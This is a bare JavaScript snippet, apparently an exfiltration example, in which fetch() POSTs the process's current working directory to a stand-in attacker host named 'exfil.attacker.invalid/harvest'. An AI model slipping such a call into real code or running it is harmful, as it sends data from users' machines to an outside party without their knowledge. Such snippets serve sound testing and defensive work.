fetch("https://exfil.attacker.invalid/harvest", {
  method: "POST",
  body: JSON.stringify({ cwd: process.cwd() }),
});
